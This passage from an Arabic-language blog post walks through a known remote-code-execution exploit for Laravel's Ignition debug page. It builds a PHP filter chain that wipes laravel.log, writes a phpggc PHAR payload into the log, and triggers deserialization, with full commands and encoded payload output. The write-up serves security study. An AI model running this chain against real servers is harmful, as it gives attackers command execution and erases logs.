+$f = &#x27;php://filter/write=convert.base64-decode/resource=/path/to/file.txt&#x27;;</code></pre><p id="b0b187d5-57b1-4907-8266-502bda7d0215" class="">وكمان إستنتج إن حتى لو أضفنا </p><p id="c77481a8-d548-43d6-a34f-c3234720e768" class="">bad character </p><p id="83b4ed15-e815-4c25-a23e-5ce24aaba143" class="">لل </p><p id="0e3e7d77-b883-4b5b-9ab8-8a7c6f687b29" class="">base64 encoded string</p><p id="9928304a-6686-4834-a6bc-302b39edab53" class="">.رح يقدر يفكها بشكل طبيعي ويتجاهل الزيادات</p><h2 id="ac3912c1-7645-46f2-b11e-09195fdc6992" class=""><mark class="highlight-red">Writing the log file:</mark></h2><p id="a6ba4469-e7b8-42e6-8791-adeed1821295" class="">حالياً فتنا بالجد وبدأ التفكير القوي</p><p id="f7792725-b81a-47b4-b5b8-dbeab4771a4f" class="">في </p><p id="897247f8-092a-48a8-bd2a-15e180bbd030" class="">laravel </p><p id="e8587f83-674c-419b-b9c5-f17ad53adda9" class="">في ملف </p><p id="bc8dbccd-7f85-4b7a-be99-7cbb55e6a3f3" class="">logs </p><p id="adc91e10-d6a8-4b7f-b7be-8e85bcd18262" class="">بإختصار بخزن أخطأ الي بتحصل ويسجلها </p><p id="14590719-1320-4129-8d4f-d66deaf14a1f" class="">ال </p><p id="8fe3be73-9aef-4300-a453-2e8dc899cab3" class="">default </p><p id="bf99cce2-4092-4de8-884e-c89b767ccf22" class="">:هو</p><p id="c3c51347-3314-48cb-8032-d7b0997086d9" class="">storage/logs/laravel.log</p><p id="08bb214d-bf23-4e1d-acb2-280cf2613b2e" class="">في الصورة المأخوذة من لاب الباحث، عمل خطأ حتى يشوف ماذا يحصل للملف</p><pre id="31d99332-7a0d-485a-a28b-faa0246335a5" class="code"><code>[2021-01-11 12:39:44] local.ERROR: file_get_contents(SOME_TEXT_OF_OUR_CHOICE): failed to open stream: No such file or directory {&quot;exception&quot;:&quot;[object] (ErrorException(code: 0): file_get_contents(SOME_TEXT_OF_OUR_CHOICE): failed to open stream: No such file or directory at /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php:75)
+[stacktrace]
+#0 [internal function]: Illuminate\\Foundation\\Bootstrap\\HandleExceptions-&gt;handleError()
+#1 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(75): file_get_contents()
+#2 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(67): Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution-&gt;makeOptional()
+#3 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Http/Controllers/ExecuteSolutionController.php(19): Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution-&gt;run()
+#4 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Routing/ControllerDispatcher.php(48): Facade\\Ignition\\Http\\Controllers\\ExecuteSolutionController-&gt;__invoke()
+[...]
+#32 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(103): Illuminate\\Pipeline\\Pipeline-&gt;Illuminate\\Pipeline\\{closure}()
+#33 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(141): Illuminate\\Pipeline\\Pipeline-&gt;then()
+#34 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(110): Illuminate\\Foundation\\Http\\Kernel-&gt;sendRequestThroughRouter()
+#35 /work/pentest/laravel/laravel/public/index.php(52): Illuminate\\Foundation\\Http\\Kernel-&gt;handle()
+#36 /work/pentest/laravel/laravel/server.php(21): require_once(&#x27;/work/pentest/l...&#x27;)
+#37 {main}
+&quot;}</code></pre><p id="60acf186-680b-465e-aed5-f1c47026bb7e" class="">هنا بلشت عقلية لازم ندخل لمستنا هنا ونبدأ نفكر بالإستغلال</p><h2 id="41764785-1187-4ff1-8f12-797510ccb2ae" class=""><mark class="highlight-red">the base64-decode chain shows its limits:</mark></h2><p id="9f107e7d-b253-4d71-bc15-43924ff02543" class="">هنا بدأ تظهر مشكلة في موضوع أن </p><p id="c2594ced-14e8-4b2f-b39f-7420eb64f494" class="">base64-decode</p><p id="59f7b5cc-db51-4f28-8e7f-e34af295858b" class="">في </p><p id="4bb2f81e-2d6b-4307-b033-ddd9f95178b6" class="">php </p><p id="10267149-b9da-46f5-8e9d-41c631b65ba5" class="">صح يتجاهل ال </p><p id="be2608dc-a782-41d0-9a37-dab6bd961fbb" class="">bad character </p><p id="f0459584-34c4-449c-80b5-967dc9d59a53" class="">إلا ال = إذا وجدت في نصف ال</p><p id="fde5ec23-bd00-4870-92d0-c2b8eae0f4b6" class="">string </p><p id="fde4d051-29af-488f-844f-bd11ff343859" class="">يحصل خطأ الأمر متعلق بال </p><p id="aa7eaad1-d40a-490a-98e7-f7892e4c9e35" class="">(base64)</p><p id="347687e4-151e-4cf6-8289-b89a5a79ffe5" class="">طيب نرجع لصورة ال </p><p id="428ea51c-f29a-4589-bb6b-1bf2333e32e5" class="">log </p><p id="bba5da1b-9a49-4991-8f95-d1cd88f2ffbf" class="">من الوضح أن القيمة التي أدخلناها متواجدة مرتين وأن في أشياء تسبقها (التاريخ) و أشياء تليها وتفصل بي القيمتين في الوسط و يتبعها ال </p><p id="5f9b32a5-c474-4585-8b42-e8d370395944" class="">stack trace.</p><p id="26180b32-ab83-40a4-8af0-1996d56c699e" class="">:المشكلة الثانية هي</p><p id="47739d91-8a72-46b9-8e12-f3c293946101" class="">أنه لكل تاريخ رح يكون عنا نتيجة مختلفي في موضوع ال </p><p id="57677bed-d099-49e1-9ac7-a3910d0c6c32" class="">decoding </p><p id="5e21d22f-80b2-4ff4-8078-b739b67b3df9" class="">وبهذه الحالة لكل هدف لازم نعمل </p><p id="f7d5fbf1-b9e0-446c-a00c-7a090c4dbec5" class="">payload </p><p id="14654ca0-405b-41e0-b7f9-c2f5479ff4d7" class="">.خاص فيه</p><pre id="7cc94194-78c3-419b-9364-cb40b87990ae" class="code"><code>php &gt; var_dump(base64_decode(base64_decode(&#x27;[2022-04-30 23:59:11]&#x27;)));
+string(0) &quot;&quot;
+php &gt; var_dump(base64_decode(base64_decode(&#x27;[2022-04-12 23:59:11]&#x27;)));
+string(1) &quot;2&quot;</code></pre><p id="13c150ae-ae5c-436f-b451-265924d874f2" class="">وبسب هذه الأشياء مش رح نكتب لكل هدف </p><p id="d5bd53dd-43b7-4fb3-9600-0fac7861d918" class="">exploit.</p><h2 id="3142d927-0690-49e7-9744-8d91ca4e7093" class=""><mark class="highlight-red">Enters encoding:</mark></h2><p id="92c3a5da-47a2-4818-9b29-f2750da3b70b" class="">كتلخيص لما توصلنا له للأن</p><p id="8e364d06-d7bf-4bca-b1f3-e24880e79a09" class="">شكل ال </p><p id="6c7b94ee-6811-48bd-9287-5a5b8abebec3" class="">log </p><p id="62e8f7d1-bfa4-43e3-a8e9-b78281bf326f" class="">:هو كالتالي</p><pre id="f54b1b0a-d790-4e84-907c-315fe64605cf" class="code"><code>[previous log entries]
+[prefix]PAYLOAD[midfix]PAYLOAD[suffix]</code></pre><p id="76457dd1-be39-42c8-a10c-892187a26a18" class="">كان تفكير الباحث متجه نحو حذف المحتوى الخاص بال </p><p id="dee67b75-b909-41ce-9d9c-dc2608b89100" class="">log file</p><p id="81739caa-adbf-41a0-9fdc-70a1179e2ae1" class="">:وإعادة كتابتها على طريقتنا</p><p id="75a9d51a-f81d-4eb9-9bda-5d2a2a779948" class="">وهنا رح تغير رأيك وتصير تقرأ ال</p><p id="3db0ddea-7a7a-4aa8-bca4-6f510ba955f6" class="">documentation</p><p id="6f2f3cea-c72a-48f9-9b9f-ae19d1d541a6" class="">كمان وجد </p><p id="8b54bd38-5a99-41d8-9977-a0e0573f7e35" class="">php filter</p><p id="5a6a1ae5-55b2-456d-975b-26542b477b3c" class="">من خلالها فيك تعمل </p><p id="9e75ac24-c556-42a5-aba7-8cde8681aeec" class="">clear </p><p id="721a0ce9-6c36-41e6-96c0-ec4cd084ea0d" class="">لل </p><p id="ad857bbc-c376-4c8c-b7a5-223e2a0c9aeb" class="">log file.</p><pre id="82f96f12-7015-4624-830c-2414b62b60c6" class="code"><code>php://filter/read=consumed/resource=/path/to/file.txt</code></pre><p id="f734a656-1edd-4338-bc9c-1ce1b272a8ea" class="">من بعدها ال </p><p id="956972ab-9df2-415a-823d-b4bb4d02521c" class="">error </p><p id="fa3f8cac-2ed7-49d9-be41-707b6be7636d" class="">الي رح نسببها رح تكون لوحدها في ال </p><p id="7761b9bd-bd8b-4214-b0d6-293f55b15bce" class="">log</p><pre id="461a1510-12c3-4cdd-97d0-d71ca983f011" class="code"><code>[prefix]PAYLOAD[midfix]PAYLOAD[suffix]</code></pre><p id="a2cbc14e-0df7-43f7-bfe8-3435f1e6a05d" class="">حالياً التفكير متجه نحو إلغاء الأجزاء الثانية والإبقاء على ال </p><p id="138619d5-dc11-4434-8d1e-515c50c83271" class="">payload</p><p id="6dc55898-b663-453b-99a8-54a298d2eb25" class="">:هذا الباحث مخه عظمة</p><p id="ce4dd96c-e831-4255-b1da-29446ae60c2d" class="">غير من </p><p id="df5c3833-3647-4414-88ac-aa852c894089" class="">utf16 </p><p id="f5fe1408-f74a-4fce-9a57-b18c97ddba17" class="">ل </p><p id="45b9e7a6-eb21-4b09-b543-66e0b2f2355b" class="">utf8 </p><p id="7b4737e4-67ed-4c2d-8a58-d1778fb4db4c" class="">وحافظ على ال </p><p id="abb75bfa-fbee-4a50-ab22-92ddea8234e8" class="">payload </p><p id="a04373bc-fd6a-4dc1-a91c-8efc7f5e3a25" class="">الي متكرر مرتين</p><p id="41096725-a139-4223-a5a9-eebd7ba998d8" class="">الزوائد أصبحت </p><p id="ea9b0700-12c2-41fe-a52d-e7bdf8048be1" class="">non ascii characters</p><pre id="2f10ea74-8741-4af6-bb58-605903209ca2" class="code"><code>echo -ne &#x27;[Some prefix ]P\0A\0Y\0L\0O\0A\0D\0[midfix]P\0A\0Y\0L\0O\0A\0D\0[Some suffix ]&#x27; &gt; /tmp/test.txt</code></pre><pre id="5655e17b-0c87-4924-9ecc-a9dec5f42f50" class="code"><code>php &gt; echo file_get_contents(&#x27;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt&#x27;);
+卛浯⁥牰晥硩崠PAYLOAD浛摩楦嵸PAYLOAD卛浯⁥畳晦硩崠</code></pre><p id="79a59c11-1b83-435a-8c08-cf0003fe83fa" class="">حالياً في ٢ </p><p id="be8f3d27-072f-48cd-90fc-c0766aec2e28" class="">payload </p><p id="2df168f6-0655-43b0-86bb-0bf53ffa5f11" class="">لازم نلغي الثاني إستغل الباحث طريقة ال </p><p id="fcebfdc2-c757-4496-9b4f-13d2eb425861" class="">utf16 </p><p id="b3424429-5894-40cb-89cd-30346f3db6aa" class="">وبزيادة </p><p id="f7abe58f-36ed-44f6-b498-a128914ac8b2" class="">byte </p><p id="b89b5bda-1e86-48e0-8192-f8909d7e3f03" class="">تمكن من إلغاء ال </p><p id="ea339e36-b4b7-49ad-ba5a-3d7038f14b93" class="">payload الثاني</p><pre id="63a99fca-8468-485e-ad5e-926b1c1ed4ba" class="code"><code>echo -ne &#x27;[Some prefix ]P\0A\0Y\0L\0O\0A\0D\0X[midfix]P\0A\0Y\0L\0O\0A\0D\0X[Some suffix ]&#x27; &gt; /tmp/test.txt</code></pre><pre id="32591765-5ceb-4155-a92c-60ea7c675627" class="code"><code>php &gt; echo file_get_contents(&#x27;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt&#x27;);
+卛浯⁥牰晥硩崠PAYLOAD存業晤硩偝䄀夀䰀伀䄀䐀堀卛浯⁥畳晦硩崠</code></pre><p id="325972fb-e2de-49e9-ab06-65a5a23cafb4" class="">حالياً رح نجمع الأفكار ونرجع لموضوع ال </p><p id="ca461fb8-bd47-4a4e-849b-ec22f14a3474" class="">base64 </p><p id="8aee8974-ed32-4e4f-bd4e-dd6c86b8f727" class="">مع هذا التغير من </p><p id="3f417c96-c255-4706-8a0c-e3dfd8e75ecc" class="">utf16 </p><p id="93b57c96-9c53-4d6d-84c5-316b0bbc34d8" class="">ل </p><p id="c54d6314-801c-4dad-9218-323297ec2bba" class="">utf8 </p><p id="56a38cde-7ac0-4530-bd3a-4bbcc61b9ba2" class="">كل شيئ شتغل تمام وهذا مثال</p><pre id="96b2e60b-6efe-473a-8a62-39cd916c0a59" class="code"><code>$ echo -n TEST! | base64 | sed -E &#x27;s/./\0\\0/g&#x27;
+V\0E\0V\0T\0V\0C\0E\0=\0
+$ echo -ne &#x27;[Some prefix ]V\0E\0V\0T\0V\0C\0E\0=\0X[midfix]V\0E\0V\0T\0V\0C\0E\0=\0X[Some suffix ]&#x27; &gt; /tmp/test.txt</code></pre><pre id="3f4b60a7-ee39-46c7-83da-9b9ddd47c2f8" class="code"><code>php &gt; echo file_get_contents(&#x27;php://filter/read=convert.iconv.utf16le.utf-8|convert.base64-decode/resource=/tmp/test.txt&#x27;);
+TEST!</code></pre><p id="6ecca9d3-ba1d-4f8f-a1de-87ed7c5037d4" class="">عندنا مشكلة في موضوع أن ال </p><p id="1455018f-cd1e-4d11-be3c-2034788b12ca" class="">log file </p><p id="f796f143-bfa9-41f9-a2d7-08eb9f652d4a" class="">يكون</p><p id="c3e2c2ab-75cc-4529-b4f3-260213cd6210" class="">2-byte aligned</p><p id="8116619a-9805-40a0-ba1c-b3aa3c259a59" class="">وهذا لمواضيع متعلقة بال </p><p id="a1a47e1d-8b5c-48c4-b3d4-1429d6ced3be" class="">character encoding </p><p id="69877d7c-0ce1-4f36-834c-38eaedba8b16" class="">وطريقة قرأتها من قبل الحاسوب.</p><p id="1262875e-c0da-438d-a94d-024a571b47c3" class="">فالحل كان بسيطة بزيادة هذا السطر مرتين في ال file وهكذا نتفادى هذا ال </p><p id="d83b7ff8-3ef0-4ecd-b695-23ee48d8153e" class="">error</p><pre id="e5f74743-a51a-47bf-8cbb-c3e4f7649ccb" class="code"><code>[prefix]PAYLOAD_A[midfix]PAYLOAD_A[suffix]
+[prefix]PAYLOAD_B[midfix]PAYLOAD_B[suffix]</code></pre><p id="2090a082-019d-4807-b195-46f843fa648f" class="">الموضوع في تفكير وتجربة كثير ، من أجل التوصل لحل بإعادة قرأة ال</p><p id="1aeec1f2-a9ea-4b02-933e-a78d1883fd6c" class="">data </p><p id="cf1afde7-52f5-4f8d-8f69-fd92b1edace2" class="">التي بداخلها رح نحط ال </p><p id="b51dcbeb-55a8-4d1a-9a71-30f9c0bc3d58" class="">payload</p><p id="5a493fa7-7333-4396-a3a2-40d7a36619bd" class="">إذا رجعنا خطوتين لورا رح نلاحظ</p><p id="be206f25-768b-44d5-82a3-15386a91decc" class="">\0</p><p id="80d3b25c-8a69-48bc-8e48-b89c169e8686" class="">وهي Null character</p><p id="14a93f83-050f-4689-a919-6285fd365eaf" class="">وهون في مشكلة لأن إستخدمناها و </p><p id="5839cc6d-46ae-40c2-a803-da5a6546568d" class="">php </p><p id="79ea0ef2-4882-4306-98ba-dccecf539594" class="">رح يعطيني </p><p id="25319968-f5bb-473b-937c-06a748821f72" class="">error عليها</p><p id="d644fcff-9e2c-4667-9f37-51d5404bba58" class="">أوكي تمام</p><p id="f944553e-ccb2-4d3b-b24b-62a4c5eb5145" class="">:وجد</p><p id="2c937a4b-cd3a-4c23-a288-d7b4ceff9879" class="">filter </p><p id="1eab9856-4fe4-4f11-823f-46c44884a95d" class="">ثاني أسمه</p><p id="9984c8e8-6b40-488c-8e6a-780b4c494fee" class="">convert.quoted-primtable-decode</p><p id="c596e222-e342-4d71-9510-a6dbb44c5b9c" class="">والحمدلله خلصت سلسلة الفيلتر الخاصة ب php ولازم أذكر أن هدف هذه الفلاتر هو قرأة و إعادة الكتاب إلى الملف بعد التحويل وهكذا</p><p id="b483a914-6953-4575-9970-ce7d210a0a13" class="">اخر filter رح يحول ال </p><p id="5a0c1566-1646-424c-a5be-9cc4c1387579" class="">Null byte </p><p id="0342b4de-ddf7-43a0-aa42-fceba6a79424" class="">ل</p><p id="14f5902f-753d-42de-8f28-a2d9827af6a1" class=""> =00</p><p id="e84d5e87-5b10-4fcb-99ad-aca48f6216a8" class="">و رح تسأل عن الهدف من هالعملية هو تحويل ال log file ل phar file وإستغلاله لتنفيذ الأوامر على السيرفر</p><pre id="dcfefe29-ca3e-41c5-a6a6-2412e464df35" class="code"><code>viewFile: php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/path/to/storage/logs/laravel.log</code></pre><p id="8b2a5221-5103-4f42-9749-7772e99c26fb" class="">:لحظة العظمة</p><h2 id="91801c69-f918-4ff7-85b1-e083d888b95b" class=""><mark class="highlight-red">Complete exploit steps:</mark></h2><p id="6180a9ad-7b27-414a-8691-5129343175ab" class="">step1: create phpggc payload and encode it</p><p id="84d6013d-40fe-4fc0-ab4c-68edf0c86bf6" class="">في أداة تستخدم أسمها </p><p id="fa003a7f-d81a-4c21-855a-b897a5948b41" class="">phpggc</p><p id="403b4dff-2dfb-4925-b4f0-6bcea55a88d1" class="">ببساطة تتستخدم لل </p><p id="dc6f5834-8e42-4b13-9911-f73d1ccf8882" class="">unserialize </p><p id="2044f598-a0f8-4270-bb04-26c953773cdc" class="">وهو عكس </p><p id="b199e8fe-0f82-418f-b55b-e0d3019ce0e1" class="">serialize</p><p id="58a40ea3-f52d-49ac-9ceb-1693bc6b59e9" class="">ال </p><p id="cbeb45c3-35cc-4c89-a449-412519a477ac" class="">serialization </p><p id="65ae4a43-cd64-4b74-b7e9-533aeb5e886a" class="">هو طريقة لتحويل ال </p><p id="8eaec8ea-788b-44d2-80ab-683759476234" class="">data structure </p><p id="446cfeec-e668-4b9e-8a40-de03a074bbe7" class="">المعقدة ل </p><p id="ebcb1832-3096-4713-8a23-d1f2d0c74f33" class="">byte stream </p><p id="9d6d1847-07a6-4990-879e-703f92ae1005" class="">لتسهيل نقلها وتخزينها.</p><p id="3e70395c-dc0e-4851-9637-8015687fdc4a" class="">في </p><p id="790accc5-8d77-465c-a4fb-7b67f2f2337a" class="">function </p><p id="68f6ee14-fbdd-4638-9ef5-4bf317df9b4b" class="">بال </p><p id="57899dd1-d124-4d8a-9b17-16d7f50c5ccd" class="">php </p><p id="7f6a4201-1961-4c78-a80b-cb34fc7b510d" class="">مختصة بالموضوع رح أتركها في أخر المقال</p><p id="33031be0-609c-46c9-9adb-ec5301cb8bdb" class="">الأداة رح تساعدك بعمل ال </p><p id="b1ffc073-3ea1-42e7-9d67-11ea76bb5666" class="">payload </p><p id="420e1e1d-1d27-496a-b3de-9427bef7c677" class="">وهذا ما ورح نعمله </p><p id="bcdc635f-06a3-4403-bea6-ae5966a8da82" class="">base64 encode</p><p id="12e85886-28b8-431d-a1de-6b9f3a550e8c" class="">ومن بعدها نغير ال </p><p id="616649fe-ad0f-4f16-981e-1cfea72f0f6e" class="">Null character </p><p id="a6f91e54-1888-4cfa-ba8d-d99d52941142" class="">كلها بإسخدام أوامر لينكس وأهمها </p><p id="b2b30b23-738e-409b-af72-405b49eab788" class="">sed.</p><p id="eccd7d9d-1f23-494a-a55a-19b218d336b6" class="">وهذه هي العملية العكسية للتي سبقت </p><p id="8004aef7-5217-4127-879c-414e2c57dd86" class="">(php filter)</p><p id="925c1409-f75f-471c-8659-5188f56610ef" class=""> والهدف منها ترتيب القرأة رح يكون عكس لهذه العملية</p><pre id="12d93829-ae2f-442c-a92c-a32f3ee04fcf" class="code"><code>php -d&#x27;phar.readonly=0&#x27; ./phpggc monolog/rce1 system id --phar phar -o php://output | base64 -w0 | sed -E &#x27;s/=+$//g&#x27; | sed -E &#x27;s/./\0=00/g&#x27;
+U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=00M=00f=00n=00/=00Y=00B=00A=00A=00A=00A=00A=00Q=00A=00A=00A=00A=00F=00A=00B=00I=00A=00Z=00H=00V=00t=00b=00X=00l=00u=00d=00Q=004=00A=001=00U=00l=003=00t=00r=00Q=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00B=000=00Z=00X=00N=000=00U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=007=00m=00z=00i=004=00H=00Q=00A=00A=00A=00B=000=00A=00A=00A=00A=00O=00A=00B=00I=00A=00L=00n=00B=00o=00Y=00X=00I=00v=00c=003=00R=001=00Y=00i=005=00w=00a=00H=00B=00u=00d=00Q=004=00A=00V=00y=00t=00B=00h=00L=00Y=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=008=00P=003=00B=00o=00c=00C=00B=00f=00X=000=00h=00B=00T=00F=00R=00f=00Q=000=009=00N=00U=00E=00l=00M=00R=00V=00I=00o=00K=00T=00s=00g=00P=00z=004=00N=00C=00l=00B=00L=00A=00w=00Q=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00C=00E=00A=00D=00H=005=00/=002=00A=00Q=00A=00A=00A=00A...=00Q=00</code></pre><p id="0714b9c3-6085-4aea-87c6-f7cc932cd404" class="">step2: clear logs</p><p id="d6e94590-e1ab-4646-aef9-a6fab5f2bf1e" class="">متل ما تففنا نحذف ال </p><p id="a2f9069b-a520-4dba-922b-70a121c2456b" class="">log file</p><pre id="d351ea07-7f57-4316-81d9-6d1456819bab" class="code"><code>viewFile: php://filter/read=consumed/resource=/path/to/storage/logs/laravel.log</code></pre><p id="76dbbd75-2ad4-4351-9daf-b300a2fbec0b" class="">step3: create first log entry for alignment</p><p id="e940f1bb-6d0b-4b03-9514-cab23e4ca3b0" class="">موضوع ال 2-byte</p><pre id="f4944007-9b2e-46f8-b85c-2967b1aee91b" class="code"><code>viewFile: AA</code></pre><p id="554f2c04-004c-432c-b9d4-548109e6be18" class="">step4: create log with entry payload</p><p id="0a0fbf4f-b450-4157-ab99-cb9ad0288a9f" class="">ندخل ال </p><p id="2bfa90cb-26a5-4ea8-b86d-25a43e1ebf94" class="">payload </p><p id="e14e4c7c-855e-4bd0-9f1c-d5cfc1fb342d" class="">الخاص</p><p id="223018da-9a6b-4de8-8df0-b663aa5a535c" class=""> فينا على ال</p><p id="3d670b8b-482c-4149-8043-04b6fbed9f2d" class=""> log file</p><pre id="41a0407f-b8c0-4fb1-afd3-5b7110aa0670" class="code"><code>viewFile: U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=00M=00f=00n=00/=00Y=00B=00A=00A=00A=00A=00A=00Q=00A=00A=00A=00A=00F=00A=00B=00I=00A=00Z=00H=00V=00t=00b=00X=00l=00u=00d=00Q=004=00A=001=00U=00l=003=00t=00r=00Q=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00B=000=00Z=00X=00N=000=00U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=007=00m=00z=00i=004=00H=00Q=00A=00A=00A=00B=000=00A=00A=00A=00A=00O=00A=00B=00I=00A=00L=00n=00B=00o=00Y=00X=00I=00v=00c=003=00R=001=00Y=00i=005=00w=00a=00H=00B=00u=00d=00Q=004=00A=00V=00y=00t=00B=00h=00L=00Y=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=008=00P=003=00B=00o=00c=00C=00B=00f=00X=000=00h=00B=00T=00F=00R=00f=00Q=000=009=00N=00U=00E=00l=00M=00R=00V=00I=00o=00K=00T=00s=00g=00P=00z=004=00N=00C=00l=00B=00L=00A=00w=00Q=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00C=00E=00A=00D=00H=005=00/=002=00A=00Q=00A=00A=00A=00A...=00Q=00==00==00</code></pre><p id="656e913f-e91f-4e09-9e16-24308eafa41a" class="">step5: Apply our Filter to convert the log file into a valid PHAR :</p><p id="ee3691d7-8fe0-4dca-8570-f07e0276ecf2" class="">هنا رح نتطبق ال </p><p id="c2cf1247-ce03-478a-8cbd-75281005ec44" class="">filters </p><p id="8c5ad815-dbae-4304-8372-48ca617c8f09" class="">لي جمعناهم مع بعض </p><p id="8ddacafb-4b3b-484e-b0ad-c293cffe97e7" class="">وبهذه الطريقة منعيد كتابة ال</p><p id="9e72c7ed-f16b-451d-bcc4-70bee8318af0" class="">file </p><p id="6b2a1772-a425-4af5-a47f-7159afcf69fd" class="">بالطريقة لي رح تخلينا نعمل </p><p id="f2339905-c3ee-413c-96cc-88785af2134f" class="">execute </p><p id="dfddc479-ed24-426a-bc9e-6194bfc00611" class="">ل php من خلال phar</p><pre id="bd275dbb-f8cc-4bab-a6ce-972b0192eea6" class="code"><code>viewFile: php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/path/to/storage/logs/laravel.log</code></pre><p id="3990f5b8-7a20-4afd-a1d8-3e1313924b5c" class="">step6: Launch the PHAR deserialization:</p><p id="d35c0c12-5f88-43c1-a0be-ae9aef2bf0a5" class="">وأخيراً نطلب ال </p><p id="cc144dd6-4f7f-4d8c-a25b-7aaf37dd353d" class="">phar file </p><p id="3739ce6c-0c32-43b3-b3ad-c682097b63bf" class="">الي هو ال </p><p id="15ab7be3-feb4-408a-a40d-e55ee26f77e2" class="">log file </p><p id="784a37de-e716-4733-baa3-37a2cd0078a6" class="">ونحاول نفتعل </p><p id="7171d497-c136-40f6-8c94-f5a11c9e52a4" class="">error </p><p id="04a7fa29-b385-4cab-aee1-11f8259bc2cc" class="">حتى تظهر لائحة ال </p><p id="c4d94719-7cd4-4a4a-9c1b-a319beadf094" class="">error </p><p id="990e8f80-210f-4190-9936-d0a6c59a5b14" class="">و هكذا نحصل على ال </p><p id="625560b0-dd37-484a-bbdd-b295567991b0" class="">rce.</p><p id="229339a2-f1ef-41f5-b428-a754e3897f91" class="">الإستغلال مكتوب ب </p><p id="c94d7a73-9300-4ae9-961a-95e51055072b" class="">python </p><p id="61afb014-55de-41e9-b78d-abb19974968d" class="">رسمت مخطط لل </p><p id="7e7e1934-dc9b-4466-ae66-ea3290422421" class="">functiom </p><p id="23e4e58e-2dc2-45dc-a9a0-c06af81c2993" class="">.و ترتيبها و ربطتهم بالخطوات المذكورة هنا، ليكون بطريقة أسهل </p><p id="8503baf4-914f-4e46-adad-7f8b10df15c7" class="">
+</p><p id="44bb7692-3787-4bbb-a5b8-2e13025f4e57" class="">وبس تقرأ الخريطة الخاصة بالإستغلال لازم تنتبه أنه في كل عمليتنا إسغلينا ال </p><p id="ede81c49-f8bf-492b-bec8-43d471713161" class="">viewFile </p><p id="61af332a-e3a7-4470-8024-47dcfad6778c" class="">من خلال تغيرها وإستخدام ال </p><p id="2b78b96e-9637-4b0e-8801-0cd749f91541" class="">error </p><p id="15d01885-c754-4a75-b1ae-d2f44c26634d" class="">التي يتم تخزينها في ال</p><p id="291e0bff-e2f1-456a-8d9c-47dfb3952bdd" class="">logs </p><p id="96c0ed67-df34-426e-b279-450ff4ba85b7" class="">لإدخال ال </p><p id="28ec6ad3-5b8c-4780-bda6-1de6e0122aa7" class="">payload </p><p id="4462aa56-caf4-4a1a-8e65-4e9f27f9c7db" class="">الخاص فينا، ومن ثم عند إظهار الخطأ سيتم تنفيذ ال </p><p id="2bc731b9-2c8f-4f61-ad97-cd950389fd33" class="">deserialization </p><p id="6793ee0a-2b53-4d5b-9a16-d213e2b764a5" class="">وبالتالي إعادة تكوين ال </p><p id="41422cca-9391-4edb-bc7c-438085db3670" class="">payload  .و تنفيذه </p><p id="f6d24771-d437-4732-b7ba-3a6dffa3a00a" class="">
+</p><p id="eb40680f-a875-4adf-84f6-e6c84e9b6a16" class="">ال </p><p id="fc2b5d4c-ac67-43e9-affd-c50144c7bc69" class="">mind map </p><p id="5f591b3f-4726-41d3-97c2-d537e850746c" class="">متوفر. في ال </p><p id="bba921b0-afbf-4c34-af23-15e1eb731add" class="">github </p><p id="26fe0713-4aac-443e-882c-75d0d9fb2d97" class="">.الخاص في</p><p id="31ec99bd-1760-4c44-9bce-31c15abc33a2" class="">إن أحسنت فمن الله، وإن أسأت أو أخطأت فمن نفسي</p><p id="a143e01d-7fae-4bae-9eac-a48c9eb7fe62" class="">والشيطان</p><p id="80963a41-b13e-49f9-8cd7-b9baf5f7f899" class="">🙌شكراً</p><h2 id="39dbf34f-125b-42dc-8d5e-870e00780a94" class=""><mark class="highlight-red">References:</mark></h2><p id="6af5fe94-5df3-4343-9125-6a99839120ef" class=""><mark class="highlight-teal">original blog:</mark></p><p id="603a6ae4-958d-47b3-8c96-c879af90f856" class=""><a href="https://www.ambionics.io/blog/laravel-debug-rce">https://www.ambionics.io/blog/laravel-debug-rce</a></p><p id="a368e329-0a8a-4607-815d-3125e718a608" class=""><mark class="highlight-teal">PHP wappers:</mark></p><p id="28959af2-9cc8-4fdc-a9a6-c72e45af956a" class=""><a href="https://www.php.net/manual/en/wrappers.php.php">https://www.php.net/manual/en/wrappers.php.php</a></p><p id="d2ae5b97-ca4c-4e1f-a027-456dbb1517c4" class=""><mark class="highlight-teal">PHP method: </mark></p><p id="d366be8e-1193-4fcc-aa3d-dcd85f2d22d6" class=""><mark class="highlight-teal">serialize(): </mark><a href="https://www.w3schools.com/php/func_var_serialize.asp">https://www.w3schools.com/php/func_var_serialize.asp</a></p><p id="e8ebe72b-e46d-49b4-8ad5-4ea3305836e0" class=""><mark class="highlight-teal">unserialize():</mark> <a href="https://www.w3schools.com/php/func_var_unserialize.asp">https://www.w3schools.com/php/func_var_unserialize.asp</a></p><p id="5bcd5d7e-df8c-4a23-b3df-a04389dc6406" 